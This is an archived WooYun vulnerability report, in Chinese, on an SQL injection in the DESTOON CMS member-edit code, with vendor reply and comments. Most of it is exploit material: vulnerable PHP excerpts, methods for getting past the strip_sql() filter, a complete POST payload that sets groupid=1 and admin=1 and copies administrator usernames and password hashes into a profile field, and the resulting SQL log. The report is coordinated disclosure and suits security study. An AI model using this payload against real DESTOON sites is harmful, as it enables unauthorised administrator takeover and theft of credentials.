{"id": 619, "wybug_id": "wooyun-2014-069012", "wybug_title": "DESTOON 最新版注入可提升为管理员权限", "wybug_corp": "DESTOON", "wybug_author": "Noxxx", "wybug_date": "2014-07-19 18:32", "wybug_open_date": "2014-10-17 18:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向公众公开  简要描述： 20140716注入,提升权限可登陆后台（终于要升级了..） 详细说明：  由于注册的时候 公司名称没有做什么过滤 （只是 看是否有数字 如有就不通过 反之通过）修改资料的时候又从数据库中吧 公司名称 查出来 然后进入查询流程所导致的注入 由于 admin权限的表不是独立的 所以我们可以更新 用户组 1 -  注册 判断公司名称的代码 在 member.class.php is_member() 中124 - 130 行\nif($groupid > 5) {\t\t\tif(strlen($member['company']) < 2) return $this->_($L['member_company_null']);\t\t\tif(preg_match(\"/[0-9]+/\", $member['company'])) return $this->_($L['member_company_bad']); //这里 判断是不是数字 是数字就判断结束 .\t\t\tif($this->company_exists($member['company'])) return $this->_($L['member_company_reg']);\t\t\tif(strlen($member['type']) < 2) return $this->_($L['member_type_null']);\t\t\tif(strlen($member['telephone']) < 6) return $this->_($L['member_telephone_null']);\t\t}\n  2 - 修改资料 的代码member/edit.inc.php\n$user = $do->get_one(); //这里先把查出来  在赋值到$post去 （防止有先变量被修改） 因为公司名称 是可以控制的 我们输入注册的时候 输入 \\ 让他转义掉后面的单引号if($submit) {\tif($post['password'] && $user['password'] != md5(md5($post['oldpassword']))) message($L['error_password']);\tif($post['payword'] && $user['payword'] != md5(md5($post['oldpayword']))) message($L['error_payword']);\t$post['groupid'] = $user['groupid'];\t$post['email'] = $user['email'];\t$post['passport'] = $user['passport'];\t$post['company'] = $user['company']; //在这里\t$post['domain'] = $user['domain'];\t$post['icp'] = $user['icp'];\t$post['skin'] = $user['skin'];\t$post['template'] = $user['template'];\t$post['edittime'] = $DT_TIME;\t$post['bank'] = $user['bank'];\t$post['account'] = $user['account'];\t$post['validated'] = $user['validated'];\t$post['validator'] = $user['validator'];\t$post['validtime'] = $user['validtime'];\t$post['vemail'] = $user['vemail'];\t$post['vmobile'] = $user['vmobile'];\t$post['vtruename'] = $user['vtruename'];\t$post['vbank'] = $user['vbank'];\t$post['vcompany'] = $user['vcompany'];\t$post['vtrade'] = $user['vtrade'];\t$post['trade'] = $user['trade'];\t$post['support'] = $user['support'];\t$post['inviter'] = $user['inviter'];\tif($post['vmobile']) $post['mobile'] = $user['mobile'];\tif($post['vtruename']) $post['truename'] = $user['truename'];\tif($do->edit($post)) {  //进入修改查询流程 我们进去看看\n3 - edit() 的代码\nfunction edit($member)\t{\t\tif(!$this->is_member($member)) return false; \t\t$member = $this->set_member($member);\t\t$r = $this->get_one();\t\t$member['linkurl'] = userurl($r['username'], '', $member['domain']);\t\t$member_fields = array('company','passport','sound','email','msn','qq','ali','skype','gender','truename','mobile','department','career','groupid','areaid', 'edittime','black','bank','account','vemail','vmobile','vbank','vtruename','vcompany','vtrade','trade','support','inviter'); //会员列\t\t$company_fields = array('company','type','areaid', 'catid','catids','business','mode','regyear','regunit','capital','size','address','postcode','telephone','fax','mail','homepage','sell','buy','introduce','thumb','keyword','linkurl','groupid','domain','icp','validated','validator','validtime','skin','template');//公司列\t\t$member_sql = $company_sql = '';\t\tforeach($member as $k=>$v) {\t\t\tif(in_array($k, $member_fields)) $member_sql .= \",$k='$v'\"; //遍历数据 有符合的就连接起来 \t\t\tif(in_array($k, $company_fields)) $company_sql .= \",$k='$v'\"; //遍历数据 有符合的就连接起来 \t\t}\t\tif($member['password']) {\t\t\t$password = md5(md5($member['password']));\t\t\t$member_sql .= \",password='$password'\";\t\t}\t\tif($member['payword']) {\t\t\t$payword = md5(md5($member['payword']));\t\t\t$member_sql .= \",payword='$payword'\";\t\t}        $member_sql = substr($member_sql, 1);        $company_sql = substr($company_sql, 1);\t    $this->db->query(\"UPDATE {$this->table_member} SET $member_sql WHERE userid=$this->userid\");//进入查询\t     $this->db->query(\"UPDATE {$this->table_company} SET $company_sql WHERE userid=$this->userid\");//进入查询\t\t$content_table = content_table(4, $this->userid, is_file(DT_CACHE.'/4.part'), $this->table_company_data);\t    $this->db->query(\"UPDATE {$content_table} SET content='$member[content]' WHERE userid=$this->userid\");\t\t$member['userid'] = $this->userid;\t\t$member['vip'] = $r['vip'];\t\tuserclean($member['username']);\t\treturn true;\t}\n4 . 构造exp由于post是个数组 又用了 foreach 我们可以 随意控制数组的位置 而且可以 先把 post[company]=ok先赋值掉（占个位子） 后面接着我们可控字段就可以了 ---还有个就是 全局过滤的问题 strip_sql()原先是 /select([[:space:]\\*\\/\\-])/i这样的 只需要 select(xxx)from(xx) 这样就能了 现在是 /select([[:space:]\\*\\/\\-\\(])/i  不过 还是能绕过过滤 select+(XXXX)from这样既可,还有个问题就是 where这个被直接过滤掉了\"/where/i\"更新的时候,就不好办了 容易把所有用户全部更新掉..研究了一下 ORDER  BY username=16541651564  DESC LIMIT 1 这样就可以了 .. 不过你注册的用户名必须为数字的exp:tab=3&post[truename]=1&post[sound]=1&post[type]=1111&post[areaid]=1&post[catid]=,0,&post[business]=11ssssssssssssssss&post[regyear]=2004&post[regunit]=14&post[company]=ok&post[address]=,groupid=1 ORDER BY username=16541651564 DESC LIMIT 1#&post[ali]=,groupid=1,admin=1 ,mobile=(SELECT+PW FROM(SELECT+(MAKE_SET(-1,admin,username,PASSWORD)) AS PW FROM destoon_member ORDER BY admin DESC ) a LIMIT 0,1) ORDER  BY username=16541651564  DESC LIMIT 1 #&&post[telephone]=132232132&post[fax]=&post[mail]=&post[homepage]=&post[introduce]=aaaaa&submit=1mobile=这里也可以直接 (SELECT+(MAKE_SET(-1,admin,username,PASSWORD)) LIMIT 0,1)我这个有点麻烦..sql没学多少。。sql日志UPDATE destoon_member SET truename='1',sound='1',areaid='1',company='xxxxx\\',ali=',groupid=1,admin=1 ,mobile=(SELECT+PW FROM(SELECT+(MAKE_SET(-1,admin,username,PASSWORD)) AS PW FROM destoon_member ORDER BY admin DESC ) a LIMIT 0,1) ORDER  BY username=16541651564  DESC LIMIT 1 #',groupid='6',email='1231ee23@qq.com',passport='16541651564',edittime='1405752561',bank='',account='',vemail='0',vmobile='0',vtruename='0',vbank='0',vcompany='0',vtrade='0',trade='',support='',inviter='',msn='',qq='' WHERE userid=12UPDATE destoon_company SET type='1111',areaid='1',catid=',0,',business='11ssssssssssssssss',regyear='2004',regunit='14',company='xxxxx\\',address=',groupid=1 ORDER BY username=16541651564 DESC LIMIT 1#',telephone='132232132',fax='',mail='',homepage='',introduce='',groupid='6',domain='',icp='',skin='',template='',validated='0',validator='',validtime='0',postcode='',mode='',keyword='xxxxx\\默认地区,11ssssssssssssssss,,,',capital='',catids=',,',linkurl='http://127.0.0.1/php/destoon_new/index.php?homepage=16541651564' WHERE userid=12-----------------注册的时候用burp 修改下公司 名称 ：xxx\\    漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-07-20 11:31 厂商回复： 感谢反馈，我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-19 19:01 |    \t\tCoffeeSafe \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:37        )\t\t \n  掉渣天~~~~~    \n     2014-07-20 23:26 |    \t\tMartes \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:3        | 人若无名，便可专心练剑)\t\t \n  恭喜大牛快要生了， 膜拜下~~    \n     2014-08-09 15:19 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  这个username 也可以用 userid代替    \n     2014-10-20 16:39 |    \t\t宇少 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:41        | Jyhack-TeaM：bbs.jyhack.com 群:308694453...)\t\t \n  后台要关闭数据验证才可以的 所以很鸡勒    \n     2014-10-20 17:23 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  @宇少 没影响    \n     2014-10-22 10:49 |    \t\t浪子老柒 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:2        | 关注网络安全)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}